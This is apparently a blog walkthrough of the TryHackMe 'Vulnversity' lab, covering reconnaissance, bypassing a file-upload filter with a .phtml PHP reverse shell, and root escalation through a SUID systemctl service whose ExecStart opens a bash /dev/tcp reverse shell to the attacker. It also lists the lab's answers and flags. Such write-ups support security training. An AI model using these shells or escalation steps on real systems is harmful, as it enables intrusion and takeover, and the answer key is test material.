---
title: Vulnversity Walkthrough
date: 2024-01-03 11:33:00 +0800
categories: [Walkthrough]
tags: [TryHackMe]
---

## Task 1 Deploy Machine

Deploy the victim machine
Connect the attacking machine with OpenVPN

## Task 2 Reconnaissance 

start nmap scan 
```bash
nmap -sV 10.10.160
```
  <img src="/images/vulnv/vuln1.png" alt="Securinets" style="width: auto; height: auto; margin-right: 10%;" />

### Q1: Scan the box; how many ports are open?
Answer: 6

### Q2: What version of the squid proxy is running on the machine?

Answer: 3.5.12

### Q3: How many ports will Nmap scan if the flag -p-400 was used?

Answer: 400

### Q4: What is the most likely operating system this machine is running?

Answer: Ubuntu

### Q5: What port is the web server running on?

Answer: 3333

### Q6: What is the flag for enabling verbose mode using Nmap?

Answer: -v

## Task 3 Locating directories using Gobuster

Download gobuster :
```bash
sudo apt-get install gobuster
```
Download Directory wordlist from dirbuster github :
```bash
wget https://github.com/daviddias/node-dirbuster/blob/master/lists/directory-list-1.0.txt
```
Run gobuster :
```bash
gobuster dir -u http://[Machine_IP]:3333 -w directory-list-1.0.txt
```

  <img src="/images/vulnv/vuln2.png" alt="Securinets" style="width: auto; height: auto; margin-right: 10%;" />

### Q1: What is the directory that has an upload form page?

Answer: /internal/

## Task 4 Compromise the Webserver

### Q1: What common file type you’d want to upload to exploit the server is blocked? Try a couple to find out.

Answer: .php

Intercept the POST request with burpsuite

  <img src="/images/vulnv/vuln3.png" alt="Securinets" style="width: auto; height: auto; margin-right: 10%;" />

Click on action then send to intruder OR Ctrl+l
Here we can modify the request

  <img src="/images/vulnv/vuln4.png" alt="Securinets" style="width: auto; height: auto; margin-right: 10%;" />

locate filename and click on add§ before and after the extension

  <img src="/images/vulnv/vuln5.png" alt="Securinets" style="width: auto; height: auto; margin-right: 10%;" />
  <img src="/images/vulnv/vuln6.png" alt="Securinets" style="width: auto; height: auto; margin-right: 10%;" />

Click on Payloads and add all possible extensions to the payload

  <img src="/images/vulnv/vuln7.png" alt="Securinets" style="width: auto; height: auto; margin-right: 10%;" />

Click on start attack and see the Response for each extension

  <img src="/images/vulnv/vuln8.png" alt="Securinets" style="width: auto; height: auto; margin-right: 10%;" />

We can see that the .phtml is accepted as input

  <img src="/images/vulnv/vuln9.png" alt="Securinets" style="width: auto; height: auto; margin-right: 10%;" />

### Q2: What extension is allowed after running the above exercise?

Answer: .phtml

Now we need to install the reverse shell script

```bash
wget https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
```
change the extension for this file to .phtml
change the IP address in the script to our kali machine IP and listening port

$ip = ‘Kali_IP’;
$port = 1234;

  <img src="/images/vulnv/vuln10.png" alt="Securinets" style="width: auto; height: auto; margin-right: 10%;" />

Now before uploading this shell-script to the website we need to start listening on the port we defined earlier
```bash
nc -lvnp 1234
```
Upload the file to the website, then navigate to this URL :
```
http://[Machine_IP]:3333/internal/uploads/php-reverse-shell.phtml
```
Now we will see that the shell has popped in our netcat listner
  <img src="/images/vulnv/vuln11.png" alt="Securinets" style="width: auto; height: auto; margin-right: 10%;" />
```bash
ls 
cd home
ls
```
  <img src="/images/vulnv/vuln12.png" alt="Securinets" style="width: auto; height: auto; margin-right: 10%;" />

### Q3: What is the name of the user who manages the webserver?

Answer: bill
```bash
cd bill
ls
cat user.txt
```
Now we navigate to bill directory and look for the flag
  <img src="/images/vulnv/vuln13.png" alt="Securinets" style="width: auto; height: auto; margin-right: 10%;" />

### Q4: What is the user flag?

Answer: 8bd7992fbe8a6ad22a63361004cfcedb

## Task 5 Privilege Escalation
Since we already have a shell in the machine, we will use it now to find files that have root privilege

```bash
find / -perm -u=s -exec ls -l {} \; 2>/dev/null

```
  <img src="/images/vulnv/vuln14.png" alt="Securinets" style="width: auto; height: auto; margin-right: 10%;" />

### Q1: On the system, search for all SUID files. Which file stands out?

Answer: /bin/systemctl

What is systemctl ?
systemctl control the systemd system and service manager
So next step is to create on our linux machine a service that grant us a shell
lets start by creating the service
```bash
touch root.service
gedit root.service
```
here is the payload inside root.service file

```
[Unit]
Description= testing priv-esca

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c ‘bash -i >& /dev/tcp/10.14.93.236/4444 0>&1’

[Install]
WantedBy=multi-user.target
```
Now we need to start a http server on our linux machine to transfer the file to target machine 
```bash
python3 -m http.server — bind [Kali_IP] 8080
```
On the target machine shell we need to navigate to /tmp and download the service
```bash
cd tmp
wget http://[Kali_IP]:8080/root.service
```
  <img src="/images/vulnv/vuln15.png" alt="Securinets" style="width: auto; height: auto; margin-right: 10%;" />

Enable the service command 
```bash
/bin/systemctl enable /tmp/root.service
```
  <img src="/images/vulnv/vuln16.png" alt="Securinets" style="width: auto; height: auto; margin-right: 10%;" />

On another terminal in our kali we need to start listening on the port we have previously set in root.service
```bash
nc -lvnp 4444
```
  <img src="/images/vulnv/vuln17.png" alt="Securinets" style="width: auto; height: auto; margin-right: 10%;" />

Finally we need to start the service and we will get our shell in kali terminal
```bash
systemctl start root.service
```
  <img src="/images/vulnv/vuln18.png" alt="Securinets" style="width: auto; height: auto; margin-right: 10%;" />

Finally we acces the root directory and extract the flag
```bash
cd root
ls
cat root.txt
```

  <img src="/images/vulnv/vuln19.png" alt="Securinets" style="width: auto; height: auto; margin-right: 10%;" />

### Q2: What is the root flag value?

Answer: a58ff8579f0a9270368d33a9966c7fd5